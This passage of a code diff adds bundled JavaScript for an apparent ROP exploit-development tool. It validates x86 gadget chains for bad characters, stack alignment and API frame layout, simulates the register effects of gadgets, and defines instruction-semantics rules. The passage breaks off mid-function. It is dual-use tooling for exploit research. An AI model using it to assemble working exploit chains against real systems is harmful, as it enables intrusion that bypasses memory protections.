+            expectedFrameWords: expectedWords,
+            status: "not_checked",
+            detail: `${apiName} expects ${expectedWords} frame words (1 retaddr + ${knownArgCount} args); chain contains gadget machinery \u2014 frame word count not verifiable from flat steps, verify against builder output`
+          };
+        } else {
+          const actualCount = steps.length;
+          let status;
+          let detail;
+          if (actualCount < expectedWords) {
+            status = "too_few";
+            detail = `${apiName} requires ${expectedWords} frame words (1 retaddr + ${knownArgCount} args), but chain has ${actualCount}`;
+          } else if (actualCount > expectedWords) {
+            status = "too_many";
+            detail = `${apiName} requires ${expectedWords} frame words (1 retaddr + ${knownArgCount} args), but chain has ${actualCount}`;
+          } else {
+            status = "ok";
+            detail = `Frame matches ${apiName}: ${expectedWords} words (1 retaddr + ${knownArgCount} args)`;
+          }
+          frameCheck = { api: apiName, expectedArgCount: knownArgCount, expectedFrameWords: expectedWords, status, detail };
+        }
+      }
+    }
+    if (badchars.length === 0) {
+      assumptions.push("No bad characters specified \u2014 byte-level check skipped");
+    } else {
+      assumptions.push(`Bad characters: ${badchars.map((b) => `0x${(b & 255).toString(16).padStart(2, "0")}`).join(" ")}`);
+    }
+    if (unresolved.length > 0) {
+      assumptions.push(`${unresolved.length} placeholder(s) must be resolved before deployment`);
+    }
+    const gadgetSteps = steps.filter((s) => s.kind === "gadget");
+    if (gadgetSteps.length > 0) {
+      assumptions.push(`${gadgetSteps.length} gadget address(es) assumed stable (non-ASLR module, preferred base)`);
+    }
+    const frameOk = !frameCheck || frameCheck.status === "ok" || frameCheck.status === "not_checked";
+    return {
+      valid: hits.length === 0 && unresolved.length === 0 && aligned && frameOk,
+      dwordCount: steps.length,
+      totalStackBytes: totalBytes,
+      alignment: aligned ? "aligned" : "misaligned",
+      badcharHits: hits,
+      unresolvedPlaceholders: unresolved,
+      frameCheck,
+      assumptions
+    };
+  }
+  function lookupGadgetByAddress(corpus, address) {
+    for (const g of corpus.gadgets) {
+      for (const loc of g.locations) {
+        if (loc.virtualAddress !== void 0 && __bi(loc.virtualAddress) === address) {
+          return g;
+        }
+      }
+    }
+    return void 0;
+  }
+  function cloneRegs(regs) {
+    return __spreadValues({}, regs);
+  }
+  var X86_REGS = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp"];
+  function simulateGadget(gadget, regs, steps, currentIndex) {
+    var _a, _b, _c, _d, _e, _f, _g, _h, _i;
+    const sideEffects = [];
+    const popTargets = [];
+    let consumed = 0;
+    for (const instr of gadget.instructions) {
+      const m = instr.mnemonic.toLowerCase();
+      const ops = instr.operands.map((o) => o.trim().toLowerCase());
+      if (m === "ret") {
+        break;
+      }
+      if (m === "pop") {
+        const reg = ops[0];
+        if (reg && X86_REGS.includes(reg)) {
+          consumed++;
+          const targetIdx = currentIndex + consumed;
+          if (targetIdx < steps.length) {
+            const targetStep = steps[targetIdx];
+            const val = resolveStepDword(targetStep);
+            regs[reg] = val !== void 0 ? hex323(val) : (_a = targetStep.placeholder) != null ? _a : "?";
+            popTargets.push({ reg, stepIndex: targetIdx });
+          } else {
+            regs[reg] = "? (past end of chain)";
+            sideEffects.push(`pop ${reg} reads past chain end`);
+          }
+        }
+      } else if (m === "xchg") {
+        const [a, b] = ops;
+        if (a && b && X86_REGS.includes(a) && X86_REGS.includes(b)) {
+          const tmp = (_b = regs[a]) != null ? _b : "?";
+          regs[a] = (_c = regs[b]) != null ? _c : "?";
+          regs[b] = tmp;
+          sideEffects.push(`xchg ${a}, ${b}`);
+        }
+      } else if (m === "mov") {
+        const dst = ops[0];
+        const src = ops[1];
+        if (dst && src) {
+          if (X86_REGS.includes(dst) && X86_REGS.includes(src)) {
+            regs[dst] = (_d = regs[src]) != null ? _d : "?";
+            sideEffects.push(`${dst} \u2190 ${src} (${(_e = regs[src]) != null ? _e : "?"})`);
+          } else if (X86_REGS.includes(dst)) {
+            const match = /\[(e[a-z]{2})\]/.exec(src);
+            if (match) {
+              const ptrReg = match[1];
+              regs[dst] = `*[${(_f = regs[ptrReg]) != null ? _f : ptrReg}]`;
+              sideEffects.push(`${dst} \u2190 *[${ptrReg}] (runtime deref)`);
+            } else {
+              regs[dst] = "?";
+            }
+          } else {
+            const dstMatch = /\[(e[a-z]{2})\]/.exec(dst);
+            if (dstMatch && X86_REGS.includes(src)) {
+              sideEffects.push(`*[${dstMatch[1]}] \u2190 ${src} (${(_g = regs[src]) != null ? _g : "?"})`);
+            }
+          }
+        }
+      } else if (m === "add" || m === "sub") {
+        const reg = ops[0];
+        if (reg && X86_REGS.includes(reg)) {
+          const immMatch = /^(?:0x)?([0-9a-f]+)$/i.exec((_h = ops[1]) != null ? _h : "");
+          if (immMatch && regs[reg] && /^0x[0-9A-F]+$/i.test(regs[reg])) {
+            const current = parseInt(regs[reg].replace(/^0x/i, ""), 16) >>> 0;
+            const imm = parseInt(immMatch[1], 16) >>> 0;
+            const result3 = m === "add" ? current + imm >>> 0 : current - imm >>> 0;
+            regs[reg] = hex323(result3);
+          } else {
+            regs[reg] = "?";
+          }
+          sideEffects.push(`${m} ${reg}, ${ops[1]}`);
+        }
+      } else if (m === "xor") {
+        const [a, b] = ops;
+        if (a === b && X86_REGS.includes(a)) {
+          regs[a] = hex323(0);
+          sideEffects.push(`${a} \u2190 0 (xor self)`);
+        } else if (a && X86_REGS.includes(a)) {
+          regs[a] = "?";
+          sideEffects.push(`xor ${a}, ${b} (clobber)`);
+        }
+      } else if (m === "neg" || m === "not" || m === "inc" || m === "dec") {
+        const reg = ops[0];
+        if (reg && X86_REGS.includes(reg)) {
+          if (regs[reg] && /^0x[0-9A-F]+$/i.test(regs[reg])) {
+            const v = parseInt(regs[reg].replace(/^0x/i, ""), 16) >>> 0;
+            let result3;
+            if (m === "neg")
+              result3 = -v >>> 0;
+            else if (m === "not")
+              result3 = ~v >>> 0;
+            else if (m === "inc")
+              result3 = v + 1 >>> 0;
+            else
+              result3 = v - 1 >>> 0;
+            regs[reg] = hex323(result3);
+          } else {
+            regs[reg] = "?";
+          }
+          sideEffects.push(`${m} ${reg}`);
+        }
+      } else if (m === "jmp") {
+        sideEffects.push(`jmp ${ops[0]} (dispatch)`);
+        break;
+      } else if (m === "push") {
+        if (ops[0] && X86_REGS.includes(ops[0])) {
+          sideEffects.push(`push ${ops[0]} (${(_i = regs[ops[0]]) != null ? _i : "?"})`);
+        }
+      } else if (m === "nop" || m === "int3") {
+      } else {
+        if (ops[0] && X86_REGS.includes(ops[0])) {
+          sideEffects.push(`${instr.originalText} (may clobber ${ops[0]})`);
+        }
+      }
+    }
+    return { consumed, sideEffects, popTargets };
+  }
+  function analyzeRuntime(input) {
+    var _a, _b;
+    const { steps, corpus } = input;
+    if (!corpus) {
+      return {
+        available: false,
+        reason: "No ROP corpus loaded \u2014 runtime trace requires gadget instruction data. Load a corpus with rop.scan() first.",
+        trace: [],
+        finalRegisters: {},
+        registerClobbers: [],
+        assumptions: []
+      };
+    }
+    const regs = {};
+    for (const r of X86_REGS)
+      regs[r] = "?";
+    const trace = [];
+    const assumptions = [];
+    const registerWrites = /* @__PURE__ */ new Map();
+    let i = 0;
+    while (i < steps.length) {
+      const step = steps[i];
+      const espOffset = i * 4;
+      const dword = stepDwordHex(step);
+      if (step.placeholder) {
+        trace.push({
+          stepIndex: i,
+          espOffset,
+          dwordHex: "????????",
+          action: `PLACEHOLDER: ${step.placeholder}`,
+          kind: "placeholder",
+          registersAfter: cloneRegs(regs),
+          sideEffects: [],
+          notes: [`Unresolved: ${step.placeholder} \u2014 ${step.comment}`]
+        });
+        i++;
+        continue;
+      }
+      if (step.kind === "gadget" && step.address !== void 0) {
+        const gadget = lookupGadgetByAddress(corpus, step.address);
+        const instrText = gadget ? gadget.instructions.map((ins) => ins.normalizedText || ins.originalText).join(" ; ") : "? (not in corpus)";
+        if (!gadget) {
+          trace.push({
+            stepIndex: i,
+            espOffset,
+            dwordHex: dword,
+            action: `GADGET: ${dword} \u2014 ${step.comment}`,
+            kind: "gadget",
+            registersAfter: cloneRegs(regs),
+            sideEffects: [],
+            notes: [`Address ${dword} not found in corpus \u2014 cannot trace instructions`]
+          });
+          assumptions.push(`Gadget at ${dword} not in corpus; register effects unknown from step ${i} onward`);
+          i++;
+          continue;
+        }
+        const { consumed, sideEffects, popTargets } = simulateGadget(gadget, regs, steps, i);
+        for (const { reg, stepIndex } of popTargets) {
+          const writes2 = (_a = registerWrites.get(reg)) != null ? _a : [];
+          writes2.push(stepIndex);
+          registerWrites.set(reg, writes2);
+        }
+        for (const effect of sideEffects) {
+          const match = /^(e[a-z]{2}) ←/.exec(effect);
+          if (match) {
+            const writes2 = (_b = registerWrites.get(match[1])) != null ? _b : [];
+            writes2.push(i);
+            registerWrites.set(match[1], writes2);
+          }
+        }
+        trace.push({
+          stepIndex: i,
+          espOffset,
+          dwordHex: dword,
+          action: `GADGET: ${instrText}`,
+          kind: "gadget",
+          registersAfter: cloneRegs(regs),
+          sideEffects,
+          notes: []
+        });
+        for (let p = 0; p < consumed; p++) {
+          const opIdx = i + 1 + p;
+          if (opIdx < steps.length) {
+            trace.push({
+              stepIndex: opIdx,
+              espOffset: opIdx * 4,
+              dwordHex: stepDwordHex(steps[opIdx]),
+              action: `POP operand for: ${step.comment}`,
+              kind: "pop-operand",
+              registersAfter: cloneRegs(regs),
+              sideEffects: [],
+              notes: [steps[opIdx].comment]
+            });
+          }
+        }
+        const lastInstr = gadget.instructions[gadget.instructions.length - 1];
+        if ((lastInstr == null ? void 0 : lastInstr.mnemonic) === "ret" && lastInstr.operands.length > 0) {
+          const retN = parseInt(lastInstr.operands[0].replace(/^0x/i, ""), 16);
+          if (retN > 0) {
+            const padCount = Math.floor(retN / 4);
+            for (let p = 0; p < padCount; p++) {
+              const padIdx = i + 1 + consumed + p;
+              if (padIdx < steps.length) {
+                trace.push({
+                  stepIndex: padIdx,
+                  espOffset: padIdx * 4,
+                  dwordHex: stepDwordHex(steps[padIdx]),
+                  action: `PADDING (ret ${retN} skip)`,
+                  kind: "padding",
+                  registersAfter: cloneRegs(regs),
+                  sideEffects: [],
+                  notes: []
+                });
+              }
+            }
+            i += 1 + consumed + padCount;
+            continue;
+          }
+        }
+        i += 1 + consumed;
+        continue;
+      }
+      const isPadding = step.comment.startsWith("padding (ret ");
+      trace.push({
+        stepIndex: i,
+        espOffset,
+        dwordHex: dword,
+        action: isPadding ? `PADDING: ${step.comment}` : `VALUE: ${step.comment}`,
+        kind: isPadding ? "padding" : "frame-value",
+        registersAfter: cloneRegs(regs),
+        sideEffects: [],
+        notes: []
+      });
+      i++;
+    }
+    const clobbers = [];
+    for (const [reg, writes2] of registerWrites) {
+      if (writes2.length > 1) {
+        clobbers.push(`${reg} set ${writes2.length} times (steps ${writes2.join(", ")}) \u2014 verify intended value survives to use`);
+      }
+    }
+    assumptions.push("Trace assumes linear execution: no conditional branches taken");
+    assumptions.push("Register state before chain entry is unknown (shown as '?')");
+    if (steps.some((s) => s.kind === "gadget" && s.address !== void 0 && !lookupGadgetByAddress(corpus, s.address))) {
+      assumptions.push("Some gadget addresses not found in corpus \u2014 trace may be incomplete");
+    }
+    return {
+      available: true,
+      trace,
+      finalRegisters: cloneRegs(regs),
+      registerClobbers: clobbers,
+      assumptions
+    };
+  }
+  function verifyChain(input) {
+    return {
+      static: analyzeStatic(input),
+      runtime: analyzeRuntime(input)
+    };
+  }
+  function parseManualChain(input) {
+    const tokens = input.trim().split(/\s+/).filter((t) => t.length > 0);
+    return tokens.map((token, i) => {
+      const cleaned = token.replace(/^0x/i, "");
+      const value = parseInt(cleaned, 16);
+      if (/^[0-9a-fA-F]{1,8}$/.test(cleaned) && Number.isFinite(value)) {
+        return { kind: "value", value: value >>> 0, comment: `DWORD ${i}` };
+      }
+      return { kind: "value", placeholder: token, comment: `DWORD ${i} (unresolved)` };
+    });
+  }
+
+  // src/rop/proof/types.ts
+  var PROOF_RECORD_SCHEMA_VERSION = "v1";
+
+  // src/semantics/types.ts
+  var SEMANTIC_SCHEMA_VERSION = "v1";
+
+  // src/semantics/instruction-semantics.ts
+  var REGISTERS = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"];
+  function makeSet(exact = [], conservative = [], unknown = false) {
+    return {
+      exact: new Set(exact),
+      conservative: new Set(conservative),
+      unknown
+    };
+  }
+  function confidenceForSet(set) {
+    if (set.unknown) {
+      return "UNKNOWN";
+    }
+    if (set.conservative.size > 0) {
+      return "CONSERVATIVE";
+    }
+    return "EXACT";
+  }
+  function makeField(exact = [], conservative = [], unknown = false, evidence = []) {
+    const values = makeSet(exact, conservative, unknown);
+    return {
+      values,
+      confidence: confidenceForSet(values),
+      evidence
+    };
+  }
+  function parseOperand(text) {
+    const normalized = text.trim().toLowerCase();
+    if (!normalized) {
+      return { kind: "unknown", text: normalized };
+    }
+    if (REGISTERS.includes(normalized)) {
+      return { kind: "register", text: normalized, register: normalized };
+    }
+    if (/^-?(?:0x[0-9a-f]+|\d+)$/.test(normalized)) {
+      return { kind: "immediate", text: normalized };
+    }
+    if (normalized.includes("[") || normalized.includes("]")) {
+      return { kind: "memory", text: normalized };
+    }
+    return { kind: "unknown", text: normalized };
+  }
+  function memoryRegisters(text) {
+    var _a, _b;
+    const expression = (_a = text.toLowerCase().match(/\[([^\]]+)\]/)) == null ? void 0 : _a[1];
+    if (!expression)
+      return [];
+    const matches = (_b = expression.match(/\b(?:eax|ecx|edx|ebx|esp|ebp|esi|edi)\b/g)) != null ? _b : [];
+    const registers = [];
+    for (const register2 of matches) {
+      if (REGISTERS.includes(register2) && !registers.includes(register2)) {
+        registers.push(register2);
+      }
+    }
+    return registers;
+  }
+  function isRegisterOperand(operand) {
+    return operand.kind === "register" && operand.register !== void 0;
+  }
+  function sameRegisterOperands(instruction) {
+    if (instruction.operands.length !== 2) {
+      return void 0;
+    }
+    const left = parseOperand(instruction.operands[0]);
+    const right = parseOperand(instruction.operands[1]);
+    if (!isRegisterOperand(left) || !isRegisterOperand(right)) {
+      return void 0;
+    }
+    if (left.register !== right.register) {
+      return void 0;
+    }
+    return left.register;
+  }
+  function immediateOperand(instruction) {
+    if (instruction.operands.length === 0) {
+      return void 0;
+    }
+    const operand = parseOperand(instruction.operands[instruction.operands.length - 1]);
+    if (operand.kind !== "immediate") {
+      return void 0;
+    }
+    const raw = operand.text;
+    if (raw.startsWith("0x")) {
+      return Number.parseInt(raw.slice(2), 16) >>> 0;
+    }
+    const parsed = Number.parseInt(raw, 10);
+    return Number.isFinite(parsed) ? parsed >>> 0 : void 0;
+  }
+  function parseImmediateValue(text) {
+    const raw = text.trim().toLowerCase();
+    if (/^-?0x[0-9a-f]+$/.test(raw)) {
+      const negative = raw.startsWith("-");
+      const hex4 = negative ? raw.slice(3) : raw.slice(2);
+      const parsed = Number.parseInt(hex4, 16);
+      if (!Number.isFinite(parsed)) {
+        return void 0;
+      }
+      const value = negative ? -parsed : parsed;
+      return value | 0;
+    }
+    if (/^-?\d+$/.test(raw)) {
+      const parsed = Number.parseInt(raw, 10);
+      return Number.isFinite(parsed) ? parsed | 0 : void 0;
+    }
+    return void 0;
+  }
+  function constantOffset(value) {
+    return { kind: "constant", value };
+  }
+  function selfPlus(value) {
+    return { kind: "affine", base: "self", offset: constantOffset(value) };
+  }
+  function registerExpr(register2, offset = 0) {
+    return { kind: "affine", base: register2, offset: constantOffset(offset) };
+  }
+  function constantExpr(value) {
+    return { kind: "constant", value };
+  }
+  function unknownExpr() {
+    return { kind: "unknown" };
+  }
+  function memoryExpr(address) {
+    return { kind: "memory", address, confidence: "EXACT" };
+  }
+  function memoryAddressExpression(text) {
+    const match = text.toLowerCase().match(/\[\s*([a-z]{3})(?:\s*([+-])\s*(0x[0-9a-f]+|\d+))?\s*\]/);
+    if (!match) {
+      return void 0;
+    }
+    const register2 = match[1];
+    if (!REGISTERS.includes(register2)) {
+      return void 0;
+    }
+    const rawOffset = match[3] === void 0 ? 0 : parseImmediateValue(match[3]);
+    if (rawOffset === void 0) {
+      return void 0;
+    }
+    const offset = match[2] === "-" ? -rawOffset : rawOffset;
+    return registerExpr(register2, offset);
+  }
+  function stackDeltaForRegisterImmediate(register2, delta) {
+    return register2 === "esp" && delta !== void 0 ? { exact: [delta] } : void 0;
+  }
+  function unsupported(instruction) {
+    const text = canonicalizeInstruction(instruction);
+    const unknownField = () => makeField([], [], true, [text]);
+    return {
+      schemaVersion: SEMANTIC_SCHEMA_VERSION,
+      instructionIndex: -1,
+      instruction,
+      reads: unknownField(),
+      writes: unknownField(),
+      stackDelta: unknownField(),
+      flags: unknownField(),
+      memoryReads: unknownField(),
+      memoryWrites: unknownField(),
+      flowEffects: unknownField(),
+      registerEffects: {},
+      registerEffectsUnknown: true,
+      evidence: [`unsupported instruction: ${text}`],
+      supported: false
+    };
+  }
+  var RULES = [
+    {
+      name: "pop-reg",
+      match: (instruction) => instruction.mnemonic === "pop" && instruction.operands.length === 1,
+      evaluate: (instruction) => {
+        const operand = parseOperand(instruction.operands[0]);
+        if (!isRegisterOperand(operand)) {
+          return {};
+        }
+        const popsEsp = operand.register === "esp";
+        return {
+          reads: ["esp"],
+          writes: [operand.register],
+          stackDelta: popsEsp ? { unknown: true } : { exact: [4] },
+          memoryReads: ["[esp]"],
+          flowEffects: [],
+          registerEffects: popsEsp ? { esp: unknownExpr() } : {
+            [operand.register]: memoryExpr(registerExpr("esp")),
+            esp: selfPlus(4)
+          },
+          evidence: [`POP ${operand.register} reads stack and writes ${operand.register}`]
+        };
+      }
+    },
+    {
+      name: "push-reg",
+      match: (instruction) => instruction.mnemonic === "push" && instruction.operands.length === 1,
+      evaluate: (instruction) => {
+        const operand = parseOperand(instruction.operands[0]);
+        if (!isRegisterOperand(operand)) {
+          return {};
+        }
+        return {
+          reads: [operand.register, "esp"],
+          writes: ["esp"],
+          stackDelta: { exact: [-4] },
+          memoryWrites: ["[esp]"],
+          registerEffects: { esp: selfPlus(-4) },
+          evidence: [`PUSH ${operand.register} decrements stack pointer`]
+        };
+      }
+    },
+    {
+      name: "push-imm",
+      match: (instruction) => instruction.mnemonic === "push" && instruction.operands.length === 1,
+      evaluate: (instruction) => {
+        const operand = parseOperand(instruction.operands[0]);
+        if (operand.kind !== "immediate")
+          return {};
+        return {
+          reads: ["esp"],
+          writes: ["esp"],
+          stackDelta: { exact: [-4] },
+          memoryWrites: ["[esp]"],
+          registerEffects: { esp: selfPlus(-4) },
+          evidence: [`PUSH ${operand.text} decrements stack pointer`]
+        };
+      }
+    },
+    {
+      name: "ret",
+      match: (instruction) => instruction.mnemonic === "ret",
+      evaluate: (instruction) => {
+        const imm = immediateOperand(instruction);
+        const delta = imm === void 0 ? 4 : 4 + imm;
+        const evidence = imm === void 0 ? ["RET pops return address"] : [`RET ${imm} adjusts stack by ${delta}`];
+        return {
+          reads: ["esp"],
+          writes: ["esp"],
+          stackDelta: { exact: [delta] },
+          flowEffects: ["RETURN"],
+          registerEffects: { esp: selfPlus(delta) },
+          evidence
+        };
+      }
+    },
+    {
+      name: "mov-reg-reg",
+      match: (instruction) => instruction.mnemonic === "mov" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || !isRegisterOperand(right)) {
+          return {};
+        }
+        return {
+          reads: [right.register],
+          writes: [left.register],
+          registerEffects: { [left.register]: registerExpr(right.register) },
+          evidence: [`MOV ${left.register}, ${right.register}`]
+        };
+      }
+    },
+    {
+      name: "mov-reg-imm",
+      match: (instruction) => instruction.mnemonic === "mov" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        const value = immediateOperand(instruction);
+        if (!isRegisterOperand(left) || right.kind !== "immediate" || value === void 0)
+          return {};
+        return {
+          writes: [left.register],
+          registerEffects: { [left.register]: constantExpr(value) },
+          evidence: [`MOV ${left.register}, ${right.text}`]
+        };
+      }
+    },
+    {
+      name: "mov-reg-mem",
+      match: (instruction) => instruction.mnemonic === "mov" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || right.kind !== "memory") {
+          return {};
+        }
+        const addressRegisters = memoryRegisters(right.text);
+        const address = memoryAddressExpression(right.text);
+        return {
+          reads: addressRegisters,
+          writes: [left.register],
+          memoryReads: [right.text],
+          registerEffects: { [left.register]: address ? memoryExpr(address) : unknownExpr() },
+          evidence: [`MOV ${left.register}, ${right.text}`]
+        };
+      }
+    },
+    {
+      name: "mov-mem-reg",
+      match: (instruction) => instruction.mnemonic === "mov" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (left.kind !== "memory" || !isRegisterOperand(right)) {
+          return {};
+        }
+        const addressRegisters = memoryRegisters(left.text);
+        const base = addressRegisters[0];
+        return {
+          reads: [right.register, ...addressRegisters],
+          writes: base === "esp" ? ["esp"] : [],
+          memoryWrites: [left.text],
+          evidence: [`MOV ${left.text}, ${right.register}`]
+        };
+      }
+    },
+    {
+      name: "xor-reg-reg",
+      match: (instruction) => instruction.mnemonic === "xor" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const reg = sameRegisterOperands(instruction);
+        if (!reg) {
+          return {};
+        }
+        return {
+          reads: [reg],
+          writes: [reg],
+          registerEffects: { [reg]: constantExpr(0) },
+          evidence: [`XOR ${reg}, ${reg} zeros register`]
+        };
+      }
+    },
+    {
+      name: "add-reg-reg",
+      match: (instruction) => instruction.mnemonic === "add" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || !isRegisterOperand(right)) {
+          return {};
+        }
+        return {
+          reads: [left.register, right.register],
+          writes: [left.register],
+          registerEffects: { [left.register]: { kind: "affine", base: "self", offset: { kind: "register", register: right.register } } },
+          evidence: [`ADD ${left.register}, ${right.register}`]
+        };
+      }
+    },
+    {
+      name: "add-reg-imm",
+      match: (instruction) => instruction.mnemonic === "add" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || right.kind !== "immediate") {
+          return {};
+        }
+        const imm = parseImmediateValue(right.text);
+        return {
+          reads: [left.register],
+          writes: [left.register],
+          stackDelta: stackDeltaForRegisterImmediate(left.register, imm),
+          registerEffects: { [left.register]: imm === void 0 ? unknownExpr() : selfPlus(imm) },
+          evidence: [`ADD ${left.register}, ${right.text}`]
+        };
+      }
+    },
+    {
+      name: "sub-reg-reg",
+      match: (instruction) => instruction.mnemonic === "sub" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || !isRegisterOperand(right)) {
+          return {};
+        }
+        return {
+          reads: [left.register, right.register],
+          writes: [left.register],
+          registerEffects: { [left.register]: unknownExpr() },
+          evidence: [`SUB ${left.register}, ${right.register}`]
+        };
+      }
+    },
+    {
+      name: "sub-reg-imm",
+      match: (instruction) => instruction.mnemonic === "sub" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || right.kind !== "immediate") {
+          return {};
+        }
+        const imm = parseImmediateValue(right.text);
+        return {
+          reads: [left.register],
+          writes: [left.register],
+          stackDelta: stackDeltaForRegisterImmediate(left.register, imm === void 0 ? void 0 : -imm),
+          registerEffects: { [left.register]: imm === void 0 ? unknownExpr() : selfPlus(-imm) },
+          evidence: [`SUB ${left.register}, ${right.text}`]
+        };
+      }
+    },
+    {
+      name: "neg-reg",
+      match: (instruction) => instruction.mnemonic === "neg" && instruction.operands.length === 1,
+      evaluate: (instruction) => {
+        const operand = parseOperand(instruction.operands[0]);
+        if (!isRegisterOperand(operand)) {
+          return {};
+        }
+        return {
+          reads: [operand.register],
+          writes: [operand.register],
+          registerEffects: { [operand.register]: unknownExpr() },
+          evidence: [`NEG ${operand.register}`]
+        };
+      }
+    },
+    {
+      name: "not-reg",
+      match: (instruction) => instruction.mnemonic === "not" && instruction.operands.length === 1,
+      evaluate: (instruction) => {
+        const operand = parseOperand(instruction.operands[0]);
+        if (!isRegisterOperand(operand)) {
+          return {};
+        }
+        return {
+          reads: [operand.register],
+          writes: [operand.register],
+          registerEffects: { [operand.register]: unknownExpr() },
+          evidence: [`NOT ${operand.register}`]
+        };
+      }
+    },
+    {
+      name: "or-reg-reg",
+      match: (instruction) => instruction.mnemonic === "or" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || !isRegisterOperand(right)) {
+          return {};
+        }
+        return {
+          reads: [left.register, right.register],
+          writes: [left.register],
+          registerEffects: { [left.register]: unknownExpr() },
+          evidence: [`OR ${left.register}, ${right.register}`]
+        };
+      }
+    },
+    {
+      name: "or-reg-imm",
+      match: (instruction) => instruction.mnemonic === "or" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || right.kind !== "immediate") {
+          return {};
+        }
+        return {
+          reads: [left.register],
+          writes: [left.register],
+          registerEffects: { [left.register]: unknownExpr() },
+          evidence: [`OR ${left.register}, ${right.text}`]
+        };
+      }
+    },
+    {
+      name: "and-reg-reg",
+      match: (instruction) => instruction.mnemonic === "and" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || !isRegisterOperand(right)) {
+          return {};
+        }
+        return {
+          reads: [left.register, right.register],
+          writes: [left.register],
+          registerEffects: { [left.register]: unknownExpr() },
+          evidence: [`AND ${left.register}, ${right.register}`]
+        };
+      }
+    },
+    {
+      name: "and-reg-imm",
+      match: (instruction) => instruction.mnemonic === "and" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || right.kind !== "immediate") {
+          return {};
+        }
+        return {
+          reads: [left.register],
+          writes: [left.register],
+          registerEffects: { [left.register]: unknownExpr() },
+          evidence: [`AND ${left.register}, ${right.text}`]
+        };
+      }
+    },
+    {
+      name: "adc-reg-reg",
+      match: (instruction) => instruction.mnemonic === "adc" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || !isRegisterOperand(right)) {
+          return {};
+        }
+        return {
+          reads: [left.register, right.register],
+          writes: [left.register],
+          registerEffects: { [left.register]: unknownExpr() },
+          evidence: [`ADC ${left.register}, ${right.register}`]
+        };
+      }
+    },
+    {
+      name: "adc-reg-imm",
+      match: (instruction) => instruction.mnemonic === "adc" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || right.kind !== "immediate") {
+          return {};
+        }
+        return {
+          reads: [left.register],
+          writes: [left.register],
+          registerEffects: { [left.register]: unknownExpr() },
+          evidence: [`ADC ${left.register}, ${right.text}`]
+        };
+      }
+    },
+    {
+      name: "sbb-reg-reg",
+      match: (instruction) => instruction.mnemonic === "sbb" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || !isRegisterOperand(right)) {
+          return {};
+        }
+        return {
+          reads: [left.register, right.register],
+          writes: [left.register],
+          registerEffects: { [left.register]: unknownExpr() },
+          evidence: [`SBB ${left.register}, ${right.register}`]
+        };
+      }
+    },
+    {
+      name: "sbb-reg-imm",
+      match: (instruction) => instruction.mnemonic === "sbb" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
+        if (!isRegisterOperand(left) || right.kind !== "immediate") {
+          return {};
+        }
+        return {
+          reads: [left.register],
+          writes: [left.register],
+          registerEffects: { [left.register]: unknownExpr() },
+          evidence: [`SBB ${left.register}, ${right.text}`]
+        };
+      }
+    },
+    {
+      name: "inc-reg",
+      match: (instruction) => instruction.mnemonic === "inc" && instruction.operands.length === 1,
+      evaluate: (instruction) => {
+        const operand = parseOperand(instruction.operands[0]);
+        if (!isRegisterOperand(operand)) {
+          return {};
+        }
+        return {
+          reads: [operand.register],
+          writes: [operand.register],
+          registerEffects: { [operand.register]: selfPlus(1) },
+          evidence: [`INC ${operand.register}`]
+        };
+      }
+    },
+    {
+      name: "dec-reg",
+      match: (instruction) => instruction.mnemonic === "dec" && instruction.operands.length === 1,
+      evaluate: (instruction) => {
+        const operand = parseOperand(instruction.operands[0]);
+        if (!isRegisterOperand(operand)) {
+          return {};
+        }
+        return {
+          reads: [operand.register],
+          writes: [operand.register],
+          registerEffects: { [operand.register]: selfPlus(-1) },
+          evidence: [`DEC ${operand.register}`]
+        };
+      }
+    },
+    {
+      name: "xchg-reg-reg",
+      match: (instruction) => instruction.mnemonic === "xchg" && instruction.operands.length === 2,
+      evaluate: (instruction) => {
+        const left = parseOperand(instruction.operands[0]);
+        const right = parseOperand(instruction.operands[1]);
